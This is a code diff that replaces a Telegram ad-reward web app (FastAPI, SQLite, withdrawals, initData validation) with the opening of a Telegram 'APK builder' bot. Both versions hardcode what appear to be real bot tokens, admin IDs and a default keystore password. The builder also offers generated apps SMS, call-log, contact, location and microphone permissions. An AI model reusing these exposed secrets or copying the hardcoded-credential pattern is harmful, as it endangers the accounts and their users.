@@ -1,1987 +1,1566 @@
-import os, hmac, json, time, sqlite3, hashlib, asyncio, shutil, tempfile, math
-from urllib.parse import parse_qsl
-from datetime import datetime, timezone, timedelta
-from collections import defaultdict, deque
-from typing import Optional
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+╔══════════════════════════════════════════════════════════════╗
+║      👑  APK BUILDER PRO  —  ULTRA EDITION  v4.0            ║
+║      كل شيء في ملف واحد — يولّد مشروع Android كامل           ║
+╚══════════════════════════════════════════════════════════════╝
+"""
 
-import httpx
-from fastapi import FastAPI, Request, HTTPException, Header, UploadFile, File, Form
-from fastapi.responses import HTMLResponse, Response, StreamingResponse, RedirectResponse
-from fastapi.middleware.cors import CORSMiddleware
-import uvicorn
+import os, io, json, shutil, asyncio, secrets, subprocess, textwrap
+from pathlib import Path
+from datetime import datetime
+from collections import defaultdict
 
-from telegram import (
-    Update, InlineKeyboardButton, InlineKeyboardMarkup,
-    WebAppInfo, BotCommand, MenuButtonWebApp,
-)
-from telegram.ext import (
-    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
-    MessageHandler, filters, ContextTypes,
-)
-from telegram.error import Conflict
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
+from telegram.ext import (Application, CommandHandler, MessageHandler,
+    CallbackQueryHandler, ConversationHandler, filters, ContextTypes)
+from telegram.constants import ParseMode
+from PIL import Image
 
-# ═══════════════════════════════════════════════════════════════════════
-# ⚙️ الإعدادات
-# ═══════════════════════════════════════════════════════════════════════
-BOT_TOKEN      = os.getenv("BOT_TOKEN", "8518711864:AAFpU5zbzrA4Lr5Y6F7qsx1xLxao8xeonbots").strip()
-WEBAPP_URL     = os.getenv("WEBAPP_URL", "https://xerox-f62s.onrender.com").rstrip("/") + "/"
-BOT_USERNAME   = os.getenv("BOT_USERNAME", "TarzanV1bot").lstrip("@")
-ADMIN_CONTACT  = os.getenv("ADMIN_CONTACT", "no_vi1").lstrip("@")
-UPLOAD_CHAT_ID = os.getenv("UPLOAD_CHAT_ID", "8292927197")
-HOST           = os.getenv("HOST", "0.0.0.0")
-PORT           = int(os.getenv("PORT", "8000"))
-DB_PATH        = os.getenv("DB_PATH", "ads.db")
-PING_INTERVAL  = int(os.getenv("PING_INTERVAL", "10"))
-MAX_INIT_DATA_AGE = int(os.getenv("MAX_INIT_DATA_AGE", "86400"))
+# ═══════════════════════════════════════════════════════════════
+BASE_DIR = Path(__file__).parent
+BUILD_DIR = BASE_DIR / "builds"
+KEYSTORE_DIR = BASE_DIR / "keystore"
+BUILD_DIR.mkdir(exist_ok=True)
+KEYSTORE_DIR.mkdir(exist_ok=True)
 
-ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "8233835640").split(",")
-             if x.strip().isdigit()]
+BOT_TOKEN    = os.getenv("8977337770:AAEBFTa8L9xmkO_RriHXGLn0xFTzymObQpk", "")
+ADMIN_ID     = int(os.getenv("ADMIN_ID", "8292927197"))
+BOT_USERNAME = os.getenv("BOT_USERNAME", "@apks_pro_bot")
 
-DEF_AD_REWARD      = 0.20
-DEF_DAILY_LIMIT    = 10
-DEF_MIN_WITHDRAW   = 10.00
-DEF_REFERRAL_BONUS = 0.50
-DEF_DAILY_BONUS    = 0.10
-DEF_TASK_WAIT      = 10
-DEF_TASK_CONFIRM_DELAY = 3
-
-START_TIME = time.time()
-
-RATE_LIMIT = defaultdict(lambda: deque(maxlen=30))
-
-def rate_ok(user_id, max_hits=10, window=10):
-    now = time.time()
-    q = RATE_LIMIT[user_id]
-    while q and now - q[0] > window:
-        q.popleft()
-    if len(q) >= max_hits:
-        return False
-    q.append(now)
-    return True
-
-# ═══════════════════════════════════════════════════════════════════════
-# 💾 كاش روابط ملفات تيليجرام (لتسريع التحميل 10x)
-# ═══════════════════════════════════════════════════════════════════════
-FILE_URL_CACHE = {}   # {file_id: (url, expires_at)}
-FILE_URL_TTL   = 1500 # 25 دقيقة — روابط تيليجرام تنتهي بعد ~ساعة
-
-async def get_cached_file_url(file_id):
-    if not file_id:
-        return ""
-    now = time.time()
-    cached = FILE_URL_CACHE.get(file_id)
-    if cached and cached[1] > now:
-        return cached[0]
-    url = await fetch_telegram_file(file_id)
-    if url:
-        FILE_URL_CACHE[file_id] = (url, now + FILE_URL_TTL)
-    return url
-
-# ═══════════════════════════════════════════════════════════════════════
-# 🌐 اللغات
-# ═══════════════════════════════════════════════════════════════════════
-LANGS = {
-    "ar": {
-        "dir": "rtl", "name": "العربية",
-        "welcome_title": "مرحباً بك",
-        "welcome_sub": "منصة الربح من الإعلانات الأولى",
-        "identifier": "المعرّف", "username": "اسم المستخدم",
-        "balance": "رصيدك", "total_earned": "إجمالي أرباحك",
-        "ads_today": "إعلانات اليوم", "referrals": "إحالاتك",
-        "streak": "أيام متتالية", "rank": "ترتيبك",
-        "open_app": "افتح التطبيق وابدأ الربح",
-        "my_ref": "رابط الإحالة", "my_balance": "رصيدي",
-        "contact": "تواصل معنا", "leaderboard": "المتصدرون",
-        "admin_panel": "لوحة التحكم",
-        "watch_now": "شاهد الآن", "start_ad": "ابدأ مشاهدة الإعلان",
-        "no_ads": "لا إعلانات متاحة",
-        "all_watched": "شاهدت كل الإعلانات، عد لاحقًا",
-        "daily_reward": "المكافأة اليومية", "claim": "استلام",
-        "tasks": "المهام", "task_open": "انضم الآن",
-        "task_confirm": "تأكيد الدخول", "task_ready": "استلم",
-        "task_done": "تم",
-        "wallet": "المحفظة", "profile": "حسابي", "home": "الرئيسية", "top": "المتصدرون",
-        "withdraw": "سحب", "amount": "المبلغ",
-        "send_request": "إرسال طلب السحب", "min_withdraw": "الحد الأدنى",
-        "country": "دولتك", "method": "طريقة السحب", "save_data": "حفظ",
-        "open_link": "فتح الرابط", "welcome_back": "أهلاً بعودتك",
-        "select_lang": "اختر اللغة",
-        "contact_us": "تواصل معنا", "contact_desc": "لأي استفسار أو طلب إعلان",
-        "send": "إرسال", "direct_contact": "تواصل مباشر", "open_admin": "شات الإدارة",
-        "copy": "نسخ", "share": "مشاركة", "copied": "تم النسخ",
-        "no_tasks": "لا مهام", "no_history": "لا طلبات",
-        "history": "آخر الطلبات", "pending": "معلق",
-        "approved": "موافق", "rejected": "مرفوض",
-        "not_completed": "أكمل الإعلان أولاً",
-        "limit_reached": "وصلت الحد اليومي",
-        "claim_btn": "استلم {}", "wait_txt": "انتظر", "done": "تم",
-        "confirm_first": "اضغط انضم أولاً",
-        "opening": "جارٍ الفتح", "open_btn": "فتح",
-    },
-    "en": {
-        "dir": "ltr", "name": "English",
-        "welcome_title": "Welcome",
-        "welcome_sub": "The #1 ad-based earning platform",
-        "identifier": "ID", "username": "Username",
-        "balance": "Balance", "total_earned": "Total Earned",
-        "ads_today": "Ads Today", "referrals": "Referrals",
-        "streak": "Streak", "rank": "Your Rank",
-        "open_app": "Open App & Start Earning",
-        "my_ref": "Referral Link", "my_balance": "My Balance",
-        "contact": "Contact Us", "leaderboard": "Leaderboard",
-        "admin_panel": "Admin Panel",
-        "watch_now": "Watch Now", "start_ad": "Start Watching",
-        "no_ads": "No ads available",
-        "all_watched": "You watched all ads, come back later",
-        "daily_reward": "Daily Reward", "claim": "Claim",
-        "tasks": "Tasks", "task_open": "Join Now",
-        "task_confirm": "Confirm Entry", "task_ready": "Claim",
-        "task_done": "Done",
-        "wallet": "Wallet", "profile": "Profile", "home": "Home", "top": "Top",
-        "withdraw": "Withdraw", "amount": "Amount",
-        "send_request": "Send Withdraw Request", "min_withdraw": "Minimum",
-        "country": "Country", "method": "Method", "save_data": "Save",
-        "open_link": "Open Link", "welcome_back": "Welcome back",
-        "select_lang": "Select Language",
-        "contact_us": "Contact Us", "contact_desc": "For inquiries or ad requests",
-        "send": "Send", "direct_contact": "Direct Contact", "open_admin": "Open Admin Chat",
-        "copy": "Copy", "share": "Share", "copied": "Copied",
-        "no_tasks": "No tasks", "no_history": "No history",
-        "history": "History", "pending": "Pending",
-        "approved": "Approved", "rejected": "Rejected",
-        "not_completed": "Complete the ad first",
-        "limit_reached": "Daily limit reached",
-        "claim_btn": "Claim {}", "wait_txt": "Wait", "done": "Done",
-        "confirm_first": "Click Join first",
-        "opening": "Opening", "open_btn": "Open",
-    },
+CONFIG = {
+    "version": "4.0.0",
+    "compile_sdk": 34, "min_sdk": 24, "target_sdk": 34,
+    "gradle_version": "8.2.0",
+    "max_build_time": 2400,
+    "max_apk_per_user": 5,
+    "sign_apk": True,
+    "keystore": {
+        "path": str(KEYSTORE_DIR / "release.keystore"),
+        "alias": "release",
+        "store_password": "ChangeMe123!",
+        "key_password": "ChangeMe123!",
+    }
 }
 
-# ═══════════════════════════════════════════════════════════════════════
-# 🌍 الدول
-# ═══════════════════════════════════════════════════════════════════════
-COUNTRIES = {
-    "YE": {"name": "🇾🇪 اليمن", "flag": "🇾🇪", "label": "اليمن", "methods": [
-        {"id": "jaib", "name": "💚 محفظة جيب", "fields": [
-            {"name": "wallet", "label": "رقم المحفظة", "placeholder": "7XXXXXXXX",
-             "type": "tel", "required": True}]},
-        {"id": "onecash", "name": "💙 ون كاش", "fields": [
-            {"name": "wallet", "label": "رقم المحفظة", "placeholder": "7XXXXXXXX",
-             "type": "tel", "required": True}]},
-        {"id": "kuraimi", "name": "🏦 بنك الكريمي", "fields": [
-            {"name": "account", "label": "رقم الحساب", "placeholder": "XXXX-XXXX-XXXX",
-             "type": "text", "required": True}]},
-    ]},
-    "SA": {"name": "🇸🇦 السعودية", "flag": "🇸🇦", "label": "السعودية", "methods": [
-        {"id": "card_topup", "name": "📱 شحن بطاقة", "fields": [
-            {"name": "company", "label": "الشركة", "type": "select",
-             "options": [{"v": "stc", "l": "STC"},
-                         {"v": "mobily", "l": "موبايلي"},
-                         {"v": "zain", "l": "زين"}],
-             "required": True},
-            {"name": "phone", "label": "رقم الهاتف", "placeholder": "05XXXXXXXX",
-             "type": "tel", "required": True}]},
-        {"id": "bank_iban", "name": "🏦 IBAN", "fields": [
-            {"name": "iban", "label": "رقم الآيبان", "placeholder": "SAXXXXXXXXXXXXXXXX",
-             "type": "text", "required": True}]},
-        {"id": "wallet_barcode", "name": "📸 باركود محفظة", "fields": [
-            {"name": "barcode", "label": "نص الباركود", "placeholder": "الصق الباركود",
-             "type": "text", "required": True}]},
-        {"id": "urpay", "name": "💳 UrPay", "fields": [
-            {"name": "urpay_id", "label": "رقم UrPay", "placeholder": "05XXXXXXXX",
-             "type": "tel", "required": True}]},
-    ]},
-    "OTHER": {"name": "🌍 دولي", "flag": "🌍", "label": "دولي", "methods": [
-        {"id": "paypal", "name": "💠 PayPal", "fields": [
-            {"name": "email", "label": "البريد الإلكتروني", "placeholder": "you@example.com",
-             "type": "email", "required": True}]},
-        {"id": "binance", "name": "🟡 Binance Pay", "fields": [
-            {"name": "binance_id", "label": "Binance ID", "placeholder": "123456789",
-             "type": "text", "required": True}]},
-        {"id": "usdt", "name": "💵 USDT (TRC20)", "fields": [
-            {"name": "wallet", "label": "عنوان المحفظة", "placeholder": "TXxxxx...",
-             "type": "text", "required": True}]},
-    ]},
+(ST_NAME, ST_PKG, ST_ADMIN, ST_TOKEN, ST_PERMS,
+ ST_FEATS, ST_THEME, ST_ICON, ST_CONFIRM) = range(9)
+
+PERMISSIONS = {
+    "camera":        ("📷", "الكاميرا",       "CAMERA"),
+    "read_storage":  ("📁", "قراءة الملفات",  "READ_EXTERNAL_STORAGE"),
+    "write_storage": ("💾", "كتابة الملفات",  "WRITE_EXTERNAL_STORAGE"),
+    "contacts":      ("📞", "جهات الاتصال",   "READ_CONTACTS"),
+    "location":      ("📍", "الموقع",         "ACCESS_FINE_LOCATION"),
+    "sms":           ("✉️", "الرسائل",         "READ_SMS"),
+    "call_log":      ("📋", "سجل المكالمات",  "READ_CALL_LOG"),
+    "mic":           ("🎙️", "الميكروفون",      "RECORD_AUDIO"),
+    "calendar":      ("📅", "التقويم",         "READ_CALENDAR"),
+    "phone_state":   ("📱", "حالة الهاتف",     "READ_PHONE_STATE"),
 }
 
-
-def get_method(country_code, method_id):
-    c = COUNTRIES.get(country_code)
-    if not c:
-        return None
-    return next((m for m in c["methods"] if m["id"] == method_id), None)
-
-# ═══════════════════════════════════════════════════════════════════════
-# 💾 قاعدة البيانات
-# ═══════════════════════════════════════════════════════════════════════
-def db():
-    conn = sqlite3.connect(DB_PATH, timeout=30, check_same_thread=False)
-    conn.row_factory = sqlite3.Row
-    conn.execute("PRAGMA journal_mode=WAL")
-    conn.execute("PRAGMA synchronous=NORMAL")
-    return conn
-
-
-def init_db():
-    with db() as conn:
-        conn.executescript("""
-        CREATE TABLE IF NOT EXISTS users (
-            user_id INTEGER PRIMARY KEY,
-            username TEXT, first_name TEXT, last_name TEXT,
-            language_code TEXT, is_premium INTEGER DEFAULT 0,
-            photo_url TEXT,
-            photo_file_id TEXT,
-            balance REAL DEFAULT 0, total_earned REAL DEFAULT 0,
-            ads_watched INTEGER DEFAULT 0, ads_today INTEGER DEFAULT 0,
-            last_ad_reset INTEGER DEFAULT 0,
-            streak INTEGER DEFAULT 0, last_daily INTEGER DEFAULT 0,
-            referrals INTEGER DEFAULT 0, referred_by INTEGER,
-            country TEXT, withdrawal_method TEXT, withdrawal_data TEXT,
-            banned INTEGER DEFAULT 0, created_at TEXT,
-            lang TEXT DEFAULT 'ar',
-            last_seen INTEGER DEFAULT 0
-        );
-        CREATE TABLE IF NOT EXISTS ads (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            title TEXT, description TEXT, url TEXT, contact TEXT,
-            type TEXT DEFAULT 'link',
-            video_file_id TEXT, image_file_id TEXT,
-            media_json TEXT,
-            reward REAL DEFAULT 0.20, duration INTEGER DEFAULT 15,
-            button_text TEXT, redirect_url TEXT,
-            active INTEGER DEFAULT 1, views INTEGER DEFAULT 0,
-            created_at TEXT
-        );
-        CREATE TABLE IF NOT EXISTS tasks (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            title TEXT, description TEXT, reward REAL DEFAULT 0,
-            url TEXT, icon TEXT DEFAULT '🎯',
-            active INTEGER DEFAULT 1, created_at TEXT
-        );
-        CREATE TABLE IF NOT EXISTS user_tasks (
-            user_id INTEGER, task_id INTEGER, completed_at TEXT,
-            PRIMARY KEY (user_id, task_id)
-        );
-        CREATE TABLE IF NOT EXISTS task_clicks (
-            user_id INTEGER, task_id INTEGER,
-            clicked_at TEXT,
-            opened_at TEXT,
-            confirmed_at TEXT,
-            PRIMARY KEY (user_id, task_id)
-        );
-        CREATE TABLE IF NOT EXISTS user_ads (
-            user_id INTEGER, ad_id INTEGER, watched_at TEXT,
-            PRIMARY KEY (user_id, ad_id, watched_at)
-        );
-        CREATE TABLE IF NOT EXISTS ad_sessions (
-            user_id INTEGER, ad_id INTEGER, started_at INTEGER,
-            PRIMARY KEY (user_id, ad_id)
-        );
-        CREATE TABLE IF NOT EXISTS withdrawals (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            user_id INTEGER, amount REAL,
-            country TEXT, method TEXT, method_name TEXT,
-            account_json TEXT, status TEXT DEFAULT 'pending',
-            note TEXT, created_at TEXT, processed_at TEXT
-        );
-        CREATE TABLE IF NOT EXISTS contact_requests (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            user_id INTEGER, username TEXT,
-            message TEXT, status TEXT DEFAULT 'new', created_at TEXT
-        );
-        CREATE TABLE IF NOT EXISTS settings (
-            key TEXT PRIMARY KEY, value TEXT
-        );
-        CREATE INDEX IF NOT EXISTS idx_users_earned ON users(total_earned DESC);
-        CREATE INDEX IF NOT EXISTS idx_ads_active ON ads(active);
-        CREATE INDEX IF NOT EXISTS idx_user_ads ON user_ads(user_id, ad_id);
-        CREATE INDEX IF NOT EXISTS idx_ad_sessions ON ad_sessions(user_id, ad_id);
-        """)
-
-        for tbl, col, typ in [
-            ("ads", "media_json", "TEXT"),
-            ("ads", "button_text", "TEXT"),
-            ("ads", "redirect_url", "TEXT"),
-            ("users", "lang", "TEXT DEFAULT 'ar'"),
-            ("users", "last_seen", "INTEGER DEFAULT 0"),
-            ("users", "photo_file_id", "TEXT"),
-            ("task_clicks", "opened_at", "TEXT"),
-            ("task_clicks", "confirmed_at", "TEXT"),
-        ]:
-            try:
-                conn.execute(f"ALTER TABLE {tbl} ADD COLUMN {col} {typ}")
-            except sqlite3.OperationalError:
-                pass
-
-        defaults = {
-            "ad_reward": str(DEF_AD_REWARD),
-            "daily_limit": str(DEF_DAILY_LIMIT),
-            "min_withdraw": str(DEF_MIN_WITHDRAW),
-            "referral_bonus": str(DEF_REFERRAL_BONUS),
-            "daily_bonus": str(DEF_DAILY_BONUS),
-            "task_wait": str(DEF_TASK_WAIT),
-        }
-        for k, v in defaults.items():
-            conn.execute("INSERT OR IGNORE INTO settings (key,value) VALUES (?,?)", (k, v))
-
-
-def get_setting(key, default=None):
-    with db() as conn:
-        row = conn.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()
-        return row["value"] if row else default
-
-
-def set_setting(key, value):
-    with db() as conn:
-        conn.execute("INSERT OR REPLACE INTO settings (key,value) VALUES (?,?)", (key, str(value)))
-
-
-def normalize_media_type(raw):
-    """يوحّد أنواع الوسائط: photo → image"""
-    if not raw:
-        return "image"
-    r = str(raw).lower().strip()
-    if r in ("video", "vid", "mp4"):
-        return "video"
-    return "image"
-
-
-def user_to_dict(row):
-    try:
-        account = json.loads(row["withdrawal_data"] or "{}")
-    except Exception:
-        account = {}
-    keys = row.keys() if hasattr(row, "keys") else []
-    return {
-        "user_id": row["user_id"], "username": row["username"] or "",
-        "first_name": row["first_name"] or "User", "last_name": row["last_name"] or "",
-        "is_premium": bool(row["is_premium"]), "photo_url": row["photo_url"] or "",
-        "balance": round(row["balance"], 2), "total_earned": round(row["total_earned"], 2),
-        "ads_watched": row["ads_watched"], "ads_today": row["ads_today"],
-        "daily_limit": int(get_setting("daily_limit", "10")),
-        "ad_reward": float(get_setting("ad_reward", "0.20")),
-        "streak": row["streak"], "last_daily": row["last_daily"],
-        "referrals": row["referrals"], "country": row["country"] or "",
-        "withdrawal_method": row["withdrawal_method"] or "",
-        "withdrawal_fields": account.get("fields", {}),
-        "min_withdraw": float(get_setting("min_withdraw", "10.00")),
-        "referral_bonus": float(get_setting("referral_bonus", "0.50")),
-        "daily_bonus": float(get_setting("daily_bonus", "0.10")),
-        "task_wait": int(get_setting("task_wait", "10")),
-        "is_admin": row["user_id"] in ADMIN_IDS,
-        "bot_username": BOT_USERNAME, "admin_contact": ADMIN_CONTACT,
-        "lang": (row["lang"] if "lang" in keys else "ar") or "ar",
-    }
-
-
-def get_or_create_user(user, referrer_id=None):
-    uid = user["id"]
-    now_ts = int(time.time())
-    with db() as conn:
-        row = conn.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
-        if row:
-            conn.execute(
-                """UPDATE users SET username=?, first_name=?, last_name=?,
-                   language_code=?, is_premium=?, last_seen=? WHERE user_id=?""",
-                (user.get("username", ""), user.get("first_name", ""), user.get("last_name", ""),
-                 user.get("language_code", ""), 1 if user.get("is_premium") else 0,
-                 now_ts, uid))
-            return conn.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
-
-        if referrer_id and referrer_id != uid:
-            if conn.execute("SELECT 1 FROM users WHERE user_id=?", (referrer_id,)).fetchone():
-                bonus = float(get_setting("referral_bonus", "0.50"))
-                conn.execute(
-                    """UPDATE users SET balance=balance+?, total_earned=total_earned+?,
-                       referrals=referrals+1 WHERE user_id=?""",
-                    (bonus, bonus, referrer_id))
-
-        detected_lang = "ar"
-        lc = (user.get("language_code") or "").lower()
-        if lc.startswith("en"):
-            detected_lang = "en"
-
-        conn.execute(
-            """INSERT INTO users (user_id, username, first_name, last_name,
-               language_code, is_premium, referred_by, last_ad_reset, created_at, lang, last_seen)
-               VALUES (?,?,?,?,?,?,?,?,?,?,?)""",
-            (uid, user.get("username", ""), user.get("first_name", ""), user.get("last_name", ""),
-             user.get("language_code", ""), 1 if user.get("is_premium") else 0,
-             referrer_id, now_ts, datetime.now(timezone.utc).isoformat(),
-             detected_lang, now_ts))
-        return conn.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
-
-
-def reset_ads_if_needed(row):
-    now = int(time.time())
-    if now - (row["last_ad_reset"] or 0) >= 86400:
-        with db() as conn:
-            conn.execute("UPDATE users SET ads_today=0, last_ad_reset=? WHERE user_id=?",
-                         (now, row["user_id"]))
-        row = dict(row)
-        row["ads_today"] = 0
-        row["last_ad_reset"] = now
-    return row
-
-
-def user_rank(uid):
-    with db() as conn:
-        row = conn.execute(
-            """SELECT COUNT(*) + 1 AS rank FROM users
-               WHERE banned=0 AND total_earned > (
-                   SELECT COALESCE(total_earned,0) FROM users WHERE user_id=?
-               )""", (uid,)).fetchone()
-        total = conn.execute("SELECT COUNT(*) FROM users WHERE banned=0").fetchone()[0]
-    return (row["rank"] if row else 0), total
-
-# ═══════════════════════════════════════════════════════════════════════
-# 🔐 Telegram InitData Validation
-# ═══════════════════════════════════════════════════════════════════════
-def validate_init_data(init_data):
-    if not init_data or not BOT_TOKEN:
-        return None
-    try:
-        parsed = dict(parse_qsl(init_data, keep_blank_values=True))
-        received = parsed.pop("hash", None)
-        if not received:
-            return None
-        auth_date_raw = parsed.get("auth_date")
-        if auth_date_raw:
-            try:
-                auth_age = int(time.time()) - int(auth_date_raw)
-                if auth_age < -300 or auth_age > MAX_INIT_DATA_AGE:
-                    return None
-            except (TypeError, ValueError):
-                return None
-        check = "\n".join(f"{k}={v}" for k, v in sorted(parsed.items()))
-        secret = hmac.new(b"WebAppData", BOT_TOKEN.encode(), hashlib.sha256).digest()
-        calc = hmac.new(secret, check.encode(), hashlib.sha256).hexdigest()
-        if not hmac.compare_digest(calc, received):
-            return None
-        return {"user": json.loads(parsed.get("user", "{}")),
-                "start_param": parsed.get("start_param", "")}
-    except Exception:
-        return None
-
-
-async def get_init_data_from_request(req: Request) -> Optional[str]:
-    hdr = req.headers.get("x-init-data")
-    if hdr:
-        return hdr.strip()
-    try:
-        body = await req.json()
-        return (body.get("init_data") or body.get("initData") or "").strip()
-    except Exception:
-        return None
-
-
-async def get_current_user_id(req: Request) -> int:
-    """استخراج هوية المستخدم من Telegram initData الموقّعة، وليس من بيانات العميل."""
-    init_data = await get_init_data_from_request(req)
-    if not init_data:
-        raise HTTPException(401, "initData مطلوب")
-    parsed = validate_init_data(init_data)
-    if not parsed or not parsed.get("user"):
-        raise HTTPException(401, "initData غير صالح")
-    try:
-        uid = int(parsed["user"].get("id", 0))
-    except (TypeError, ValueError):
-        uid = 0
-    if uid <= 0:
-        raise HTTPException(401, "هوية Telegram غير صالحة")
-    with db() as conn:
-        row = conn.execute("SELECT banned FROM users WHERE user_id=?", (uid,)).fetchone()
-    if row and row["banned"]:
-        raise HTTPException(403, "حسابك موقوف")
-    return uid
-
-
-async def verify_admin(req: Request, user_id_fallback: Optional[int] = None) -> int:
-    init_data = await get_init_data_from_request(req)
-    if init_data:
-        parsed = validate_init_data(init_data)
-        if parsed:
-            uid = parsed["user"].get("id")
-            if uid and uid in ADMIN_IDS:
-                return uid
-            raise HTTPException(403, "غير مصرح - ليس مشرف")
-        raise HTTPException(401, "initData غير صالح")
-    raise HTTPException(401, "initData مطلوب")
-
-# ═══════════════════════════════════════════════════════════════════════
-# 📷 Telegram Files
-# ═══════════════════════════════════════════════════════════════════════
-async def fetch_telegram_file(file_id):
-    if not BOT_TOKEN or not file_id:
-        return ""
-    try:
-        async with httpx.AsyncClient(timeout=30) as c:
-            r = await c.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getFile",
-                            params={"file_id": file_id})
-            data = r.json()
-            if not data.get("ok"):
-                return ""
-            return f"https://api.telegram.org/file/bot{BOT_TOKEN}/{data['result']['file_path']}"
-    except Exception:
-        return ""
-
-
-async def fetch_telegram_photo(user_id):
-    if not BOT_TOKEN:
-        return "", ""
-    try:
-        async with httpx.AsyncClient(timeout=10) as c:
-            r = await c.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUserProfilePhotos",
-                            params={"user_id": user_id, "limit": 1})
-            data = r.json()
-            if not data.get("ok") or not data["result"]["photos"]:
-                return "", ""
-            fid = data["result"]["photos"][0][-1]["file_id"]
-            r2 = await c.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getFile",
-                             params={"file_id": fid})
-            d2 = r2.json()
-            url = ""
-            if d2.get("ok"):
-                url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{d2['result']['file_path']}"
-            return fid, url
-    except Exception:
-        return "", ""
-
-
-def is_admin(uid):
-    return uid in ADMIN_IDS
-
-HEARTBEAT_STATS = {"internal": 0, "external": 0, "started": time.time(), "last": 0}
-
-
-async def internal_heartbeat():
-    await asyncio.sleep(20)
-    url = f"http://127.0.0.1:{PORT}/health"
-    while True:
-        try:
-            async with httpx.AsyncClient(timeout=5) as c:
-                await c.get(url)
-            HEARTBEAT_STATS["internal"] += 1
-            HEARTBEAT_STATS["last"] = int(time.time())
-        except Exception:
-            pass
-        await asyncio.sleep(PING_INTERVAL)
-
-
-async def external_heartbeat():
-    await asyncio.sleep(45)
-    url = f"{WEBAPP_URL.rstrip('/')}/health"
-    while True:
-        try:
-            async with httpx.AsyncClient(timeout=10) as c:
-                await c.get(url)
-            HEARTBEAT_STATS["external"] += 1
-        except Exception:
-            pass
-        await asyncio.sleep(PING_INTERVAL)
-
-# ═══════════════════════════════════════════════════════════════════════
-# 🚀 FastAPI
-# ═══════════════════════════════════════════════════════════════════════
-app = FastAPI(title="AdVault Pro VIP", version="11.0.0")
-app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])
-
-
-@app.get("/", response_class=HTMLResponse)
-async def root():
-    try:
-        with open("index.html", "r", encoding="utf-8") as f:
-            html = f.read()
-        html = html.replace("__BOT_USERNAME_PLACEHOLDER__", BOT_USERNAME or "")
-        html = html.replace("__ADMIN_CONTACT_PLACEHOLDER__", ADMIN_CONTACT or "")
-        return html
-    except FileNotFoundError:
-        return HTMLResponse("<h1>index.html missing</h1>", status_code=500)
-
-
-@app.get("/health")
-async def health():
-    uptime = int(time.time() - START_TIME)
-    return {
-        "ok": True, "bot": BOT_USERNAME, "uptime": uptime,
-        "uptime_human": str(timedelta(seconds=uptime)),
-        "heartbeat": HEARTBEAT_STATS,
-        "time": datetime.now(timezone.utc).isoformat(),
-    }
-
-
-@app.get("/api/langs/{code}")
-async def api_lang(code: str):
-    return LANGS.get(code, LANGS["ar"])
-
-
-@app.get("/api/langs")
-async def api_langs_all():
-    return LANGS
-
-
-@app.post("/api/auth")
-async def api_auth(req: Request):
-    body = await req.json()
-    parsed = validate_init_data(body.get("initData", ""))
-    if not parsed:
-        raise HTTPException(401, "initData غير صالح")
-    user = parsed["user"]
-    ref = None
-    sp = parsed.get("start_param", "")
-    if sp.startswith("ref_"):
-        try:
-            ref = int(sp[4:])
-        except ValueError:
-            pass
-    row = get_or_create_user(user, ref)
-    if row["banned"]:
-        raise HTTPException(403, "حسابك موقوف")
-    if not row["photo_url"] or not (row["photo_file_id"] if "photo_file_id" in row.keys() else None):
-        fid, photo = await fetch_telegram_photo(row["user_id"])
-        if photo:
-            with db() as conn:
-                conn.execute("UPDATE users SET photo_url=?, photo_file_id=? WHERE user_id=?",
-                             (photo, fid, row["user_id"]))
-    reset_ads_if_needed(dict(row))
-    fresh = db().execute("SELECT * FROM users WHERE user_id=?", (user["id"],)).fetchone()
-    return user_to_dict(fresh)
-
-
-@app.get("/api/me")
-async def api_me(req: Request):
-    user_id = await get_current_user_id(req)
-    with db() as conn:
-        row = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
-    if not row:
-        raise HTTPException(404, "غير موجود")
-    reset_ads_if_needed(dict(row))
-    fresh = db().execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
-    return user_to_dict(fresh)
-
-
-@app.get("/api/rank")
-async def api_rank(req: Request):
-    user_id = await get_current_user_id(req)
-    rank, total = user_rank(user_id)
-    return {"rank": rank, "total": total}
-
-
-@app.post("/api/set-lang")
-async def api_set_lang(req: Request):
-    body = await req.json()
-    user_id = await get_current_user_id(req)
-    lang_code = (body.get("lang") or "ar").strip()
-    if lang_code not in LANGS:
-        lang_code = "ar"
-    with db() as conn:
-        conn.execute("UPDATE users SET lang=? WHERE user_id=?", (lang_code, user_id))
-    return {"ok": True, "lang": lang_code}
-
-# ═══════════════════════════════════════════════════════════════════════
-# 📢 الإعلانات
-# ═══════════════════════════════════════════════════════════════════════
-@app.get("/api/ads")
-async def api_ads(req: Request):
-    user_id = await get_current_user_id(req)
-    with db() as conn:
-        row = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
-        if not row:
-            raise HTTPException(404, "غير موجود")
-        reset_ads_if_needed(dict(row))
-
-        ads = conn.execute(
-            """SELECT id, title, description, url, contact, type,
-                      video_file_id, image_file_id, media_json,
-                      reward, duration, button_text, redirect_url
-               FROM ads
-               WHERE active=1
-                 AND id NOT IN (
-                     SELECT ad_id FROM user_ads
-                     WHERE user_id=?
-                 )
-               ORDER BY RANDOM() LIMIT 30""",
-            (user_id,)).fetchall()
-
-        # بدء جلسة مشاهدة على الخادم؛ لا يكفي مؤقت JavaScript وحده لاستحقاق المكافأة.
-        started_at = int(time.time())
-        for ad in ads:
-            conn.execute(
-                "INSERT OR REPLACE INTO ad_sessions (user_id, ad_id, started_at) VALUES (?,?,?)",
-                (user_id, ad["id"], started_at))
-
-        fresh = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
-        total_active = conn.execute(
-            "SELECT COUNT(*) FROM ads WHERE active=1").fetchone()[0]
